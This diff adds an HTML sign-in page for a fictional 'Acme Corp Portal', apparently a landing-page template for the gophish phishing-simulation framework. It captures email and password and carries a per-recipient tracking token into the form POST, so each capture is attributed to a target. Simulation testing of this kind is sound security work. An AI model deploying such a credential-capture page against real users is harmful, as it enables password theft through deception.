@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Acme Corp — Sign in</title>
+  <style>
+    body { font-family: system-ui, sans-serif; background: #f2f4f7; margin: 0;
+           display: flex; min-height: 100vh; align-items: center; justify-content: center; }
+    .card { background: #fff; padding: 2rem 2.5rem; border-radius: 10px;
+            box-shadow: 0 4px 20px rgba(0,0,0,.08); width: 320px; }
+    h1 { font-size: 1.25rem; margin: 0 0 1.25rem; text-align: center; color: #1f2937; }
+    label { display: block; font-size: .85rem; color: #374151; margin: .75rem 0 .25rem; }
+    input[type=email], input[type=password] {
+      width: 100%; padding: .6rem .7rem; border: 1px solid #d1d5db;
+      border-radius: 6px; box-sizing: border-box; font-size: .95rem; }
+    button { width: 100%; margin-top: 1.25rem; padding: .65rem; border: 0;
+             border-radius: 6px; background: #2563eb; color: #fff; font-size: .95rem;
+             cursor: pointer; }
+    button:hover { background: #1d4ed8; }
+  </style>
+</head>
+<body>
+  <form class="card" id="login" method="POST" action="/login">
+    <h1>Acme Corp Portal</h1>
+    <label for="email">Email</label>
+    <input type="email" id="email" name="email" autocomplete="username" required>
+    <label for="password">Password</label>
+    <input type="password" id="password" name="password" autocomplete="current-password" required>
+    <!-- gophish per-target tracking id, populated from the URL below -->
+    <input type="hidden" name="rid" id="rid" value="">
+    <button type="submit">Sign in</button>
+  </form>
+
+  <script>
+    // gophish puts ?rid=<token> in each target's link. Carry it into the
+    // POST so gophish can attribute the capture to the right recipient.
+    const params = new URLSearchParams(window.location.search);
+    const rid = params.get('rid') || params.get('client_id');
+    if (rid) document.getElementById('rid').value = rid;
+  </script>
+</body>
+</html>
